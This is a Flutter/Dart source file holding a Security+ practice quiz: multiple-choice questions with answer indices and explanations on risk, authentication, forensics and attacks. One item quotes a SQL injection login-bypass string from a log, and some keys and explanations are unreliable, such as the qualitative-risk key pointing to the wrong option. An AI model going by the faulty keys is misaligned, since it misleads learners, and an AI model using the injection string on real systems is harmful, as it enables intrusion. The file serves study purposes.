// ignore_for_file: prefer_const_literals_to_create_immutables, prefer_const_constructors

import 'package:flutter/material.dart';
import 'package:security_plus/quiz.dart';

 Widget question(int _slider_value){
 return QuizWidget(questions: [

{ 'question': '  An industrial processing facility has implemented SCADA systems to monitor and manage the mission critical production lines. These ICS cannot adhere to the company’s 14-day patch application policy. How can these systems be secured to minimize malware infection? ','answers': ['Prohibit non-authorized non-essential software from executing.','Implement software firewalls.','Deploy the devices in a screened subnet.','Use an IDS.',],
'correct':1, 'q':_slider_value,'explanation': 'In this scenario, the best option is to prohibit non-authorized non-essential software from executing. A software firewall might limit network communication sessions, but not necessarily reduce the risk of malware traversing a network link. Deployment in a screened subnet is not a good option as this may expose the ICS to the Internet; deployment in a private network segment or an air-gapped network would be a better option. An IDS would only notify about a breach or intrusion or malware infection after it occurred; however, an IPS might be a reasonable option.',},
{ 'question': '  A datacenter has had repeated hardware failures. An auditor notices that systems are stacked together in dense groupings with no clear organization. What should be implemented to address this issue? ','answers': ['Visitor logs','Industrial camouflage','Gas-based fire suppression','Hot aisles and cold aisles',],
'correct':4,'explanation': 'The cause of the hardware failures is implied by the lack of organization of the equipment, which is heat buildup. This could be addressed by better management of temperature and airflow, which would be implementing host aisles and cold aisles in the datacenter. A datacenter should have few if any actual visitors (such as outsiders), but anyone entering and leaving a datacenter should be tracked and recorded in a log. However, whether or not a visitor log is present has little to do with system failure due to poor heat management. Industrial camouflage is not relevant here as it is about hiding the purpose of a facility from outside observers. A gas-based fire suppression system is more appropriate for a data center than a water-based system, but neither would cause heat problems due to poor system organization.',},
{ 'question': '  For the following items on the left match them with the authentication concepts from the right. Each item is used only once.  Iris scan  MFA  Code from SMS II. Something you have  Passphrase III. Biometric  Smart card IV. OTP  Vein & password  Single factor ','answers': ['1 and II, 2 and I, 3 and IV, 4 and V, 5 and III','1 and III, 2 and V, 3 and I, 4 and II, 5 and IV','1 and II, 2 and IV, 3 and V, 4 and I, 5 and III','1 and III, 2 and IV, 3 and V, 4 and II, 5 and I',],
'correct':4,'explanation': 'An iris scan is a form of biometric. A code from SMS is a one-time password (OTP). A passphrase is a single factor. A smart card is something you have. And the use of vein scanning and a password together is multifactor authentication (MFA). Some of the items could have been matched differently, but this is the only overall match set that is correct. Other valid matches that are incorrect for this question are: Iris scans, SMS codes, and smart card (on its own) are also single factors. Smart cards are usually implemented with a PIN, which would make them MFA, but this question did not indicate that a PIN was being used. Being able to get a SMS code implies that you have a mobile phone, which is something you have. SMS codes are also a form of MFA, as they are sent after an initial authentication using some other factor. Vein scanning is a form of biometrics. The key to this question is realizing that a passphrase can only be labeled as a single factor, since none of the other options applies. From there, each option should be considered to find the one that has only one remaining available label.',},
{ 'question': '  A user is attempting to access a website, but when they type the FDQN into the address bar of their browser, a different site appears. The user opens a command prompt and performs an nslookup query to obtain the IP address their system is receiving when resolving the FQDN of the website. The user then checks with a colleague who is working from home, and they get a different IP address and have no issue accessing the website. The user checks their IP configuration and sees that the correct DNS server is listed as their query target. The user runs the ipconfig /flushdns and then the ipconfig /displaydns commands but does not see the website listed in the final result. Which of the following is the MOST likely cause for this situation? ','answers': ['Modified HOSTS file','Falsification of DHCP details','Local DNS caching server poisoning','Alteration of the zonefile on the authoritative DNS server',],
'correct':3,'explanation': 'The most likely cause of this situation is the poisoning of the local DNS caching server. This is the DNS server that the user’s computer is using to send DNS queries to. When the user types in the fully qualified domain name (FQDN), the resolution returns the wrong IP address. The investigations performed by the user demonstrated that this is the only remaining option. After a DNS flush, the display command would have shown the FQDN and the wrong IP address if the HOSTS file had been modified since those entries would not be removed from DNS cache as they are boot persistent. When their local IP configuration is correct, it shows that DHCP was not altered to hand out an invalid DNS server IP address. Since their college had no issue getting to the correct website, the authoritative DNS server’s zonefile was not modified.',},
{ 'question': '  Jim was tricked into clicking a malicious link contained in a SPAM email message. This caused malware to be installed on his system. The malware initiated a MAC flooding attack. Soon, Jim’s system and everyone else’s in the same local network began to receive all transmissions from all other members of the network as well as communications from other parts of the next to local members. The malware took advantage of what condition in the network? ','answers': ['Social engineering','Network segmentation','ARP queries','Weak switch configuration',],
'correct':4,'explanation': 'In this scenario, the malware is performing a MAC flooding attack that causes the switch to get stuck in flooding mode. This has taken advantage of the condition that the switch had weak configuration settings. The switch should have MAC limiting enabled to prevent MAC flooding attacks from being successful. While Jim was initially fooled by a social engineering email, the question asked about the malware’s activity. A MAC flooding attack is limited by network segmentation to the local switch, but the malware took advantage of weak or poor configuration on the switch and was still successful. MAC flooding is blocked by routers from crossing between switched network segments. The malware did not use ARP queries in its attack. ARP queries can be abused in an ARP poisoning attack, but that was not described in this scenario.',},
{ 'question': '  ____________ is any data that relates to the medical status, use of medical care, payment for medical care, and other information collected about an individual in relation to their medical condition. ','answers': ['PII','PHI','Government data','Customer data',],
'correct':2,'explanation': 'Protected health information (PHI) is any data that relates to the health/medical status, use of health/medical care, payment for health/medical care, and other information collected about an individual in relation to their health/medical condition. Personally identifiable information (PII) is any data item that is linked back to the human from whom it was gleaned. Government data is any data held by a government or military entity. Customer data is information related to customers; this can include PII, PHI, financial data, as well as other business records.',},
{ 'question': '  A security breach has occurred in an environment that uses a wide range of various OSs. Which tool can be used to peruse numerous system logs regardless of format, be able to perform keyword searches, and perform data correlation? ','answers': ['journalctl','IPFix','NXLog','NetFlow',],
'correct':3,'explanation': 'The NXLog tool is a log management tool available on most OSs. This tool can function similarly to syslog, but it not limited to syslog file formats. NXLog can handle logs in nearly any format and perform rewrite, correlation, alerting, and pattern matching. The command journalctl is used to view the contents of logs generated by systemd on *nix systems. Internet Protocol Flow Information Export (IPfix) is an IETF protocol used as a standard for exporting IP flow information. NetFlow is a traffic monitoring feature on Cisco routers and switches.',},
{ 'question': '  A company has been experiencing numerous security incidents in recent months. Often so many occur at the same time that not all incidents are being properly handled due to the overtaxing of the available manpower. Everyone who could be moved to the IRT has been, and there are no funds for hiring more personnel. What tool can be used to help optimize IRP elements? ','answers': ['Playbook','Segmentation','MDM','Runbook',],
'correct':4,'explanation': 'The best tool for this situation is a SOAR runbook. A SOAR runbook is an automated series of steps that perform various operations within an incident response event, which could include data enhancement, threat containment, and notification transmission. A runbook helps in streamlining the IR process by automating some of the elements of the response. This would in turn free up time so the humans can focus on tasks that cannot be automated. A SOAR playbook is checklist of IR steps to be performed by the members of the IRT. This would not help as much in optimizing the use of time of the IRT. Segmentation is a means to divide a network to control communications for security and efficiency; thus, it is not relevant to IRP. An MDM is the wrong tool for this scenario, as an MDM is used to enforce security on mobile devices.',},
{ 'question': '  When working with an external data storage and processing provider, what provides the customer the ability to investigate performance, compliance, and violation issues with the remote service? ','answers': ['Data breach notification laws','A right-to-audit clause','The local jurisdiction','Strategic intelligence',],
'correct':2,'explanation': 'Whenever an organization works with a CSP (i.e., an external data storage and processing provider), they should seek to include a “right to audit” clause in their contract. This gives the customer the ability to investigate performance, compliance, and violation issues in the cloud service. This clause could restrict the audit to be performed by the customer or grant the ability for the customer to hire a third-party auditor or investigator. The other options do not provide this customer benefit or capability. Data breach notification laws require that a report be submitted to a regulator body in a specific time window when certain specific violating events take place. The local jurisdiction determines which laws and regulations a provider must adhere to, but they do not typically define customer rights. Strategic intelligence gathering consists of the investigative and interviewing skills that some law enforcement officers, military, and deputized civilians in certain cases use to discover information that may be relevant to a criminal activity. But this is not the establishment of a customer ability to investigate elements of a third-party provider.',},
{ 'question': '  What type of account should be issued to a trust-third-party repair technician? ','answers': ['Guest account','Privileged account','Service account','User account',],
'correct':2,'explanation': 'A repair technician typically requires more than a normal level of access to perform their duties, so a privileged account for even a trusted third-party technician is appropriate. A guest account and user (normal, limited) account are insufficient for this scenario. A service account is to be used by an application or background service, not a repair technician or other user.',},
{ 'question': '  The security response team has determined that the organization can withstand the loss of the mission critical processes for about 12 days. After extended deliberation, they elect to plan out recovery and repair strategies for each of the identified essential processes to take no more than eight days. What is this eight-day time frame? ','answers': ['MTD','RTO','RPO','MTBF',],
'correct':2,'explanation': 'In this scenario, the eight days being allocated for a recovery strategy is the recovery time objective (RTO). RTO is the amount of time allocated to recover the function in the event of a disruption. The eight days is not the maximum tolerable downtime (MTD). MTD is the maximum length of time a business function can be inoperable without causing irreparable harm to the business. The 12 days is the MTD in this scenario. The recovery point objective (RPO) is a measurement of how much data loss (as measured in time) can be survived by the organization when a disaster occurs. Mean time between failures (MTBF) is the expected typical time lapse between failures, such as between the first failure and the second failure of a device.',},
{ 'question': '  Internet Protocol Security (IPSec) is a VPN protocol for IPv4 derived from the security features of IPv6. IPSec isn’t a single protocol but rather a collection of protocols. Which component of IPSec enables multiple simultaneous VPNs? ','answers': ['ESP','SKEME','ISAKMP','AH',],
'correct':3,'explanation': 'Internet Security Association and Key Management Protocol (ISAKMP), an element of Internet Key Exchange (IKE), is used to organize and manage the encryption keys that have been generated and exchanged by Oakley and SKEME. A security association is the agreed-on method of authentication and encryption used by two entities (a bit like a digital keyring). ISAKMPs use of security associations is what enables IPSec to support multiple simultaneous VPNs from each host. Encapsulating Security Payload (ESP) provides confidentiality and integrity of packet contents. ESP provides encryption, limited authentication, and prevents replay attacks. Secure Key Exchange MEchanism (SKEME), an element of Internet Key Exchange (IKE), is a means to exchange keys securely. Authentication Header (AH) provides assurances of message integrity and nonrepudiation. AH also provides authentication, access control, and prevents replay attacks.',},
{ 'question': '  During a risk management project, an evaluation of several controls determines that none is cost effective in reducing the risk related to a specific important asset. What risk response is being exhibited by this situation? ','answers': ['Mitigation','Ignoring','Acceptance','Assignment',],
'correct':3,'explanation': 'When controls are not cost effective, they are not worth implementing. Thus, risk acceptance is the risk response in this situation. Mitigation is the application of a control, which was not done in this scenario. Assignment is the transfer of risk to a third-party, which was not done in this scenario. Ignoring risk occurs when no action, not even assessment or control evaluation is performed in relation to a risk. Since controls were evaluated in this scenario, this is not ignoring risk.',},
{ 'question': '  What cryptographic tool can be used to increase the difficulty of hashing and prevent password cracking from being as effective? ','answers': ['IV','XOR','Salt','Nonce',],
'correct':3,'explanation': 'A salt is secret data added to input material prior to the hashing process. Salting hashes makes the process of attaching hashes much more complicated and computationally intensive. Salts are sometimes part of an authentication system, such as on Linux and many websites, but not on Windows. Authentication salts add additional characters to a password just before it is hashed. Salting passwords makes the act of password cracking more difficult for an attacker.',},
{ 'question': '  Why should generic, anonymous, shared, or group accounts be prohibited? ','answers': ['No support for multifactor authentication','Not supported by LDAP','Inability to hold individuals accountable','Requires the use of a TPM',],
'correct':3,'explanation': 'Generic account prohibition is the rule that no generic or shared or anonymous accounts should be allowed in private networks or on any system where security is important. Only with unique accounts per subject is it possible to track the activities of individuals and be able to hold them accountable for their actions and any violations of company policy or the law. There is no support for multifactor authentication when generic, anonymous, shared, or group accounts, but the bigger issue is the lack of accountability. LDAP does support generic, anonymous, shared, or group accounts. Generic, anonymous, shared, or group accounts do not require the use of the TPM, as the TPM is related to cryptography often stores FDE keys.',},
{ 'question': '  While performing a survey of systems and equipment, a BCP team member discovers several servers in the sales department that are not on the organization’s inventory. The BCP team member speaks with the CTO and discovers that there is no official record of those system being purchased or deployed. The BCP team member also talks with the CSO and learns that those systems have not been receiving updates from the patch management system. What is going on in this organization? ','answers': ['Shadow IT','Dark web server deployment','File repository hosting','Use of IaaS',],
'correct':1,'explanation': 'This situation is the discovery of shadow IT. Shadow IT is a term used to describe the IT components (physical or virtual) deployed by a department without the knowledge or permission of senior management or the IT group. This is not a dark web server deployment. The dark web is the part of the Internet, which is not accessible by a standard Internet connection. This is not file repository hosting, as no mention of this concept is mention in the scenario. A file or code repository (such as GitHub) is used by programmers to organize and structure their development efforts. This is not IaaS as that is a cloud service. This scenario does not mention cloud resources, and the unknown servers are physical systems in the company building.',},
{ 'question': '  Your organization wants to have an in-house forensic investigator team to cut down on the cost of hiring third-party entities. There have been several investigations of cybercrime, both performed by insiders as well as attacks from external sources. One of the concerns about an internal investigative team is admissibility of their findings. Evidence is inadmissible in court if which of the following is violated or mismanaged? ','answers': ['Chain of custody','Service-level agreement','Privacy policy','Change management',],
'correct':1,'explanation': 'If the chain of custody is violated or mismanaged, evidence is inadmissible in court. Service-level agreements (SLAs), privacy policies, and change management aren’t associated with evidence gathering, forensics, or evidence admissibility.',},
{ 'question': '  You are performing a forensic investigation. Based upon preliminary information, you think evidence of the violating activity is still present on the system, but not located in a file. Which of the following tools would be useful in acquiring the evidence? ','answers': ['hping','WinHex','memdump','tcpdump',],
'correct':3,'explanation': 'The memdump utility extracts memory/RAM contents into a standard output stream that can be captured into a file (which can be local or off system). The command hping is a network mapper/port scanner and packet generator. hping is often used to stress test firewalls and other network security devices, perform advanced traceroute, perform OS fingerprinting, and more. hping is not a forensic data acquisition tool. WinHex is a GUI Windows utility that can edit hex information located anywhere (i.e., in-a-file, not-in-a-file, orphaned data, bad sector data, slack space, unpartitioned space, etc.) on a storage device. WinHex is useful for file acquisition, not memory acquisition. The command tool tcpdump is a raw packet-capturing utility found on Linux. It can be used to capture packets into a capture file. While tcpdump is useful in capturing nonfile network evidence, but not memory residence evidence.',},
{ 'question': '  The purpose of a replay attack is ___________. ','answers': ['Intercepting encrypted data','Preventing a server from responding to legitimate resource requests','Discovering passwords','Gaining access to resources without possessing a user’s credentials',],
'correct':4,'explanation': 'The purpose of a replay attack is to gain access to resources without possessing a user’s credentials. A replay attack isn’t used to intercept encrypted data, prevent a server from responding to legitimate resource requests, or discover passwords.',},
{ 'question': '  An application programmer needs to verify that a certificate is valid prior to establishing an TLS connection with remote systems. What of the following should be used in this situation? ','answers': ['Key escrow','Pinning','PFX file','OCSP',],
'correct':4,'explanation': 'OCSP should be used to check for revocation prior to accepting any certificate when establishing a TLS connection. Key escrow is used to store keys and certificates for recovery or investigation purposes; thus, it is not relevant in this situation. Certificate pinning is a depreciated concept that is insecure and thus does not properly protect against the acceptance of false certificates. A PFX file is a binary archiving certificate file format that can store multiple certificate objects in one file; it is not relevant to this scenario.',},
{ 'question': '  A security incident has been detected. The IRT has pulled logs from numerous systems and collected other information regarding the breach. What is the next step the IRT should take? ','answers': ['Notification','Recovery','Eradication','Containment',],
'correct':4,'explanation': 'The IRT should perform containment next, as they have already performed identification. Following containment, the steps are eradication, recovery, and lessons learned. Notification can take place at any point in an IR; it is not a defined step that must take place in a specific order.',},
{ 'question': '  The communications concept of PPP provides three authentication services, which includes PAP and EAP. What is the third option? ','answers': ['Smart card','CHAP','TLS','Mutual',],
'correct':2,'explanation': 'PPP supports PAP, CHAP, and EAP authentication systems. Challenge-Handshake Authentication Protocol (CHAP) is an authentication protocol used over a wide range of Point-to-Point Protocol (PPP) connections (including dial-up, ISDN, DSL, and cable) as a means to provide a secure transport mechanism for logon credentials. Smart cards can be used as a “something you have” authentication factor, but they are not an authentication service from PPP. TLS can be used to encrypt any application layer communication, but it is not an element of PPP. Mutual authentication occurs when both sides of a conversation authenticate to each other at the same time and usually with the same authentication method, such as certificates, but mutual is not an authentication service of PPP.',},
{ 'question': '  Which form of penetration testing is able to determine the risk level resulting from a standard employee who becomes dissatisfied with their job? ','answers': ['Partially known environment testing','Vulnerability scanning','Unknown environment testing','Known environment testing',],
'correct':1,'explanation': 'Partially known environment testing combines the two other approaches (known and unknown) to perform an evaluation based on partial knowledge of the target environment. The results are a security evaluation from the perspective of a disgruntled employee. An employee has some knowledge of the organization and its security and has some level of physical and logical access. Vulnerability scanning is used to discover weaknesses in deployed security systems to improve or repair them before a breach occurs. It is performed by an automated tool, and while it can be provided with user credentials, it does not impersonate a disgruntled employee.',},
{ 'question': '  The CISO wants to improve the organization’s ability to manage and prevent malware infections. Some of her goals are to (1) detect, record, evaluate, and respond to suspicious activities and events, which may be caused by problematic software or by valid and invalid users; (2) collect event information and report it to a central ML analysis engine; and (3) detect abuses that are potentially more advanced than what can be detected by traditional AV or HIDS. The solution needs to be able to reduce response and remediation time, reduce false positives, and be able to manage multiple threats simultaneously. What solution is the CISO wanting to implement? ','answers': ['EDR','NGFW','WAF','XSRF',],
'correct':1,'explanation': 'Endpoint detection and response (EDR) is a security mechanism that is an evolution of traditional antimalware products. EDR seeks to detect, record, evaluate, and respond to suspicious activities and events, which may be caused by problematic software or by valid and invalid users. It is a natural extension of continuous monitoring focusing on both the endpoint device itself as well as network communications reaching the local interface. Some EDR solutions employ an on-device analysis engine, while others report events back to a central analysis server or to a cloud solution. The goal of EDR is to detect abuses that are potentially more advanced than what can be detected by traditional AV or HIDS, while optimizing the response time of incident response, discarding false positives, implementing blocking for advanced threats, and protecting against multiple threats occurring simultaneously and via various threat vectors. A next-generation firewall (NGFW) is unified threat management (UTM) device that is based on a traditional firewall with numerous other integrated network and security services, thus not the security solution needed in this scenario. A web application firewall (WAF) is an appliance, server add-on, virtual service, or system filter that defines a strict set of communication rules for a website and thus not the security solution needed in this scenario. Cross-site request forgery (XSRF) is an attack against web-based services, not a malware defense.',},
{ 'question': '  What form of risk analysis can involve the Delphi technique, interviews, and focus groups? ','answers': ['Quantitative','Residual','Qualitative','Cost-benefit',],
'correct':1,'explanation': 'Qualitative risk analysis is more often situation and scenario-based than it is calculator-based. The process of performing qualitative risk analysis involves judgment, intuition, and experience. Many techniques can be used to perform qualitative risk analysis, including the Delphi technique, interviews, and focus groups. Quantitative risk analysis assigns real dollar figures to the loss of an asset. The quantitative method results in concrete probability percentages. Residual risk consists of any threats to specific assets against which upper management chooses not to implement a safeguard. In other words, residual risk is the risk that management has chosen to accept rather than mitigate. The cost-benefit equation is used in quantitative risk assessment as a means to judge the ROI of a potential security control in regard to addressing the risk from a specific asset and threat combination.',},
{ 'question': '  A penetration tester is performing initial research to learn about the target client prior to initiating intrusion attempts. Which of the following would be the most useful OSINT data source? ','answers': ['Company security policy','Social media postings','Confidential financial statements','Internal audit logs',],
'correct':2,'explanation': 'Only social media postings is an example of an OSINT data source from this list of options. Open-source intelligence (OSINT) is the gathering of information from any publicly available resource. The other options in this question are not publicly available resources.',},
{ 'question': '  A security administrator is reviewing the log of access and login failures. The log is configured to record passwords for failed logon attempts from external sources. The administrator notices a set of failed password attempts: monkeyprincessabc123qwerty1234567iloveyou What is the type of attack that seems to have been attempted based on the records from this log? ','answers': ['Brute force','Hybrid','Dictionary','Rainbow table',],
'correct':3,'explanation': 'This collection of passwords from the access log is most likely from a dictionary attack. A dictionary attack is performed using a list of passwords, many of which are common and simple. A brute-force attack would have a series of passwords that were more random but sequential. A hybrid attack uses a dictionary list password as a base word to perform brute-force modifications; such a list could be monkey9, monkey0, monkey!, monkey@, monkey#, etc. A rainbow table attack is performed offline against stolen hashes and thus would not leave any evidence in an access log.',},
{ 'question': '  You are the security manager for a large organization. During the yearly risk management reassessment, you discover a specific risk that was left as during the previous assessment. You thoroughly document the information regarding the risk, the related assets, and the potential consequences. You determine that obtaining insurance is be best approach during this evaluation. What is this method of addressing risk known as? ','answers': ['Mitigation','Tolerance','Assignment','Ignoring',],
'correct':3,'explanation': 'Assignment of risk, assigning risk, or transference of risk is placing the cost of loss that a risk represents onto another entity or organization. Purchasing insurance and outsourcing are common forms of assigning or transferring risk. The other options are incorrect. Reducing risk, or risk mitigation, is the implementation of safeguards, controls, and countermeasures to reduce and/or eliminate vulnerabilities or block threats. Acceptance of risk or tolerating risk is the valuation by management of the cost-benefit analysis of possible safeguards and the determination that the cost of the countermeasure greatly outweighs the possible cost of loss due to a risk. To reject risk or ignore risk is denying that a risk exists or hoping that it will never be realized is not a valid, prudent, due-care response to risk.',},
{ 'question': '  What does signed source code indicate? ','answers': ['Its source of origin','Its compatibility with your operating system','Its reliability','Its programming quality',],
'correct':1,'explanation': 'Signed source code indicates its source of origin, not its compatibility, reliability, or quality. This type of use is known as code signing.',},
{ 'question': '  A recent intrusion took advantage of a weak setting on a workstation named Sales103. The investigator has collected dozens of log files from various servers and network devices. To quickly determine if evidence of the attack is present in the log file, a search for the workstation name can be performed using which of the following tools? ','answers': ['tail','chmod','scanless','grep',],
'correct':4,'explanation': 'Grep is the command that can be used to search for a string or a pattern in a file and display the results. The tail command displays only the last 10 lines of a file. The chmod command is used to manipulate *nix file permission settings. The tool scanless is an online public port scan scrapper.',},
{ 'question': '  When using IoT equipment in a private environment, what is the best way to reduce risk? ','answers': ['Use public IP addresses.','Power off devices when not in use.','Keep devices current on updates.','Block access from the IoT devices to the Internet.',],
'correct':3,'explanation': 'The best means to reduce IoT risk from these options is to keep devices current on updates. Using public IP addresses will expose the IoT devices to attack from the Internet. Powering off devices is not a useful defense as the benefit of IoT is that they are always running and are ready to be used or take action when triggered or scheduled. Blocking access to the Internet will prevent the IoT devices from obtaining updates themselves, may prevent them from being controlled through a mobile device app, and will prevent communication with any associated cloud service.',},
{ 'question': '  A hacker finds a flaw while reviewing the stolen source code from a popular application. They craft an exploit to take advantage of the code flaw that grants remote access to a terminal session on the target. The attacker uses this exploit to compromise your organization and downloads sensitive internal documentation. What has just occurred? ','answers': ['DLP','Zero-day attack','Buffer overflow','XSS',],
'correct':2,'explanation': 'This scenario is describing a zero-day attack. The attacker discovered an unknown flaw and then crafts a new exploit to take advantage of that flaw. The resulting attack using the newly written exploit is a zero-day attack. It is not known to anyone but the attacker, and thus the product vendor does not have a patch or fix for it at the time of the breach of your organization. DLP is a prevention (hence the P in the acronym), not an attack. This event could be considered a failure of DLP, but since it is a new attack, it is not fair to expect an existing defense to work against new zero-day exploits. There are no details provided of the actual means by which the exploit operates, so there is no way to determine whether this is a buffer overflow or XSS-based attack or whether some other means of exploitation is used.',},
{ 'question': '  When reviewing a server’s access logs, you notice that an account named MasterAdmin had more than 30 failed logon events between 2  and 3  this morning. You realize that account not assigned to anyone to use, but instead is a dummy account. What security technique is being implemented in this situation? ','answers': ['Honeypot','Mandatory access control','SEIM','Credential stuffing',],
'correct':1,'explanation': 'This situation is using the security technique of a honeypot. The dummy account of MasterAdmin is a false account intended to attract the attention of attackers without putting the system at risk. This is not MAC, SEIM, or credential stuffing. An attacker may have used a credential stuffing technique, such as a stolen list of passwords, in their breach attempt.',},
{ 'question': '  A CISO needs to perform an assessment of the state of the organization’s security. The report must include details about the systems on the network as well as indications of flaws and weaknesses present. The company cannot afford downtime, lost data, or interruption to production activities. The CISO is also needing to complete the assessment with minimal expense and without involving outside contractors. What operation should the CISO ask his team to perform? ','answers': ['Vulnerability scanning','Ethical hacking','Unknown environment testing','Static code analysis',],
'correct':1,'explanation': 'This scenario limits the CISO’s team to performing a vulnerability scan. A vulnerability scan should be inexpensive, can be performed by in-house security team members, will identify network systems, and indicate flaws and weaknesses on those systems, and all with minimal chance of causing downtime, lost data, or interruption to production activities. Ethical hacking (aka penetration testing) and unknown environment testing (a form of pen testing) are often expensive, performed by outsiders (although not exclusively), and have a high-risk of causing downtime, lost data, or interruption to production activities. Static code analysis is not the appropriate operation for this scenario as it focuses on individual software products rather than general networked systems. Static code analysis also focuses on software code as a static file rather than a live dynamic productive system.',},
{ 'question': '  Mark approaches the building where he works. At the door a small black box is attached to the wall. John retrieves an object from his pocket and waves it near the black box. The door to the building unlocks and opens automatically. Once Mark reaches his work area, he sits down at the desk in front of his workstation. He takes the same object he used earlier to enter the building and slides it into a slot on the side of his keyboard. The computer wakes up, and he is prompted for a password. What are the two events of authentication performed by Mark known as? ','answers': ['“Something you have”','“Something you are”','“Something you know”','“Something you can do”',],
'correct':1,'explanation': 'In this scenario, the object Mark was using is a smart card. A smart card is an example of a “something you have” authentication factor. A biometric is “something you are,” a password and PINs are “something you know,” and solving a puzzle, a secret handshake, or a private knock are examples of “something you can do.”',},
{ 'question': '  Remi wants to send a message to Slayde. Remi wants the message to be able to be verified that it came from her and that it retained integrity across the transmission process. The process to accomplish this first calculates a hash of the message. What is the second step Remi’s system will perform? ','answers': ['Encrypt the message with a symmetric key','Encrypt the hash with the recipient’s public key','XOR the hash with the first block of the message','Encrypt the hash with her private key',],
'correct':4,'explanation': 'This scenario is describing the need for a digital signature. Once a hash of the message is calculated, the next step is to encrypt the hash with the sender’s private key. This scenario does not mention confidentiality, so encrypting the message with a symmetric key is not necessary. There is no common cryptographic process where a hash is encrypted by the recipient’s public key. However, if the message was encrypted by a symmetric key, then a digital envelope is used to provide the key to the recipient. A digital envelope is created by encrypting the symmetric key with the recipient’s public key. There is no common cryptographic process that XORs a hash with the first block of a message. However, symmetric encryption often XORs an initialization vector (IV) with the first block of a message.',},
{ 'question': '  A new update has been released by the vendor of an important software product, which is an essential element of a critical business task. The CSO indicates that the new software version needs to be tested and evaluated in a virtual lab which has a cloned simulation of many of the company’s production systems. Furthermore, the results of this evaluation need to be reviewed before making a decision on whether to and when to install the software update. What security principle is the CSO demonstrating? ','answers': ['Business continuity planning','Onboarding','Change management','Static analysis',],
'correct':3,'explanation': 'The CSO in this scenario is demonstrating the need to follow the security principle of change management. Change management usually involves extensive planning, testing, logging, auditing, and monitoring of activities related to security controls and mechanisms. This scenario is not describing a BCP event. A BCP event would be the evaluation of threats to business processes and then crafting response scenarios to address those issues. This scenario is not describing onboarding. Onboarding is the process of integrating a new element (such as an employee or device) into an existing system of security infrastructure. While loosely similar to change management, onboarding focuses more on ensuring compliance with existing security policies by the new member, rather than testing updates for an existing member. Static analysis is used to evaluate source code as a part of a secure development environment. Static analysis may be used as an evaluation tool in change management, but thus it is a tool, not the principle of security referenced in this scenario.',},
{ 'question': '  A company network compromise has led to the exfiltration of data. An investigation was initiated to track down evidence of the violation. Prior to the investigation, a manager terminates an employee suspected of performing the security violation. However, during the investigation, the manager was not available. Therefore, there was little evidence available to confirm that the terminated employee was the cause of the data leakage event. What is a likely cause of this situation? ','answers': ['Cross training','Log failure','Role-based access control','Centralized logging',],
'correct':2,'explanation': 'In this scenario, without the testimony of the manager, there was little evidence to support blaming the terminated employee, this was likely caused by log failure. Most investigations rely upon logs for the bulk of the evidence of a security violating activity. The lack of evidence is not caused by crosstraining, role-based access controls, nor centralized logging. In fact, if there was not a logging failure, centralized logging would have been helpful in searching for evidence in a single location.',},
{ 'question': '  A systems administrator is setting up a new data management system. It will be gathering data from numerous locations across the network, even from remote offsite locations. The data will be moved to a centralized facility where it will be stored on a massive RAID array. The data will be encrypted on the storage system using AES-256, and most files will be signed as well. The location of this data warehouse is secured so that only authorized personnel can enter into the room, and all digital access is limited to a set of security administrators. Which of the following describes the data? ','answers': ['The data is encrypted in transit.','The data is encrypted in processing.','The data is redundantly stored.','The data is encrypted at rest.',],
'correct':4,'explanation': 'In this scenario, the data is encrypted at rest with AES-256. There is no mention of encryption for transfer or processing. The data is not stored redundantly, as it is being moved, not copied, to the central data warehouse, and there is no mention of a backup.',},
{ 'question': '  What form of malicious code lies dormant until a specific triggering event is encountered? ','answers': ['Trojan horses','Viruses','Logic bombs','Worms',],
'correct':3,'explanation': 'A logic bomb is a form of malicious code that lies dormant until a specific triggering event is encountered. A Trojan horse is a malicious program disguised as something useful or legitimate. Viruses are programs designed to spread from one system to another through self-replication and to perform any of a wide range of malicious activities. Worms are designed to exploit a single flaw or hole in a system (operating system, protocol, service, or application) and then use that flaw or hole to spread or replicate themselves to other systems with the same flaw.',},
{ 'question': '  A log file that records received input from a web visitor contains the following entry: bob* or 2+3=5-- What type of attack was being attempted with this input? ','answers': ['Race condition','Destruction of data','Authentication bypass','Buffer overflow',],
'correct':3,'explanation': 'This is an example of an authentication bypass attack attempted through a SQLi technique. The “bob*” portion is an attempt to reference a user account whose name starts with “bob”. The “or” is used to then compare the selected username (which might not exist) with the next item, the statement of truth. 2 + 3 = 5 is a statement of truth (a.k.a. tautology) just the same as 1 = 1. When something is OR compared to this, it always results in 1 or truth. The - - is an end-of-line comment that converts the remaining part of the code line into a human remark. This is not a race condition attack, which would require the adjustment of process completion timing or order pattern, and that is not shown here. This is not a destruction of data attack. That could be done with SQLi using the command or expression of DROP, but that is not present. Other injection attacks, such as command injection or code injection, may be able to perform data destruction attacks, but those are not shown here either. This is not a buffer overflow attack, but a large amount of data and the potential injection shell code are not present.',},
{ 'question': '  Which of the following is not typically a legal agreement or commitment, but rather a more formal form of a reciprocal agreement or gentlemen’s handshake (neither of which is typically written down) and can be called a “letter of intent”? ','answers': ['MOU','ISA','SLA','BPA',],
'correct':1,'explanation': 'A memorandum of understanding (MOU) is an expression of agreement or aligned intent, will, or purpose between two entities. An MOU is not typically a legal agreement or commitment, but rather a more formal form of a reciprocal agreement or gentlemen’s handshake (neither of which is typically written down). An MOU can also be called a “letter of intent.” An interconnection security agreement (ISA) is a formal declaration of the security stance, risks, and technical requirements of a link between two organizations’ IT infrastructures. A service-level agreement (SLA) is a contract between a supplier and a customer. A business partners agreement (BPA) is a contract between two entities dictating the terms of their business relationship.',},
{ 'question': '  An incident investigator is attempting to track down evidence of a network intrusion to identify the breach point and the assailant. From their main workstation, the investigator performs network sniffing and does not see any relevant traffic related to the intrusion. The investigator deploys monitoring tools on a server in the affected department and finds a moderate amount of traffic related to the intrusion but suspects there is more to be obtained. The investigator then installs a digital tap into the main wiring closet where the ISP connection enters the building. From this vantage point, the investigator is able to determine the source IP address of the attacker and the identity of several systems that are currently under remote access by the intruder. What security assessment technique is demonstrated by this scenario? ','answers': ['Intelligence fusion','Maneuver','Vulnerability scanning','UBA',],
'correct':2,'explanation': 'This scenario describes an example of the security assessment technique known as maneuver. The investigator changes their physical and digital location to gain a better vantage point to collect information about a threat. Intelligence fusion is the combination of local logs with multiple sources of threat intelligence integrated into a useful analysis or report. This is not what is being described in this scenario. Vulnerability scanning is used to discover weaknesses in deployed security systems to improve or repair them before a breach occurs. This is not what is being described in this scenario. User behavior analysis (UBA) is the concept of analyzing the behavior of users, subjects, visitors, customers, etc., for some specific goal or purpose, such as detecting suspicious activity and malicious behavior. This is not specifically referenced in this scenario, but it is not necessarily completely unrelated.',},
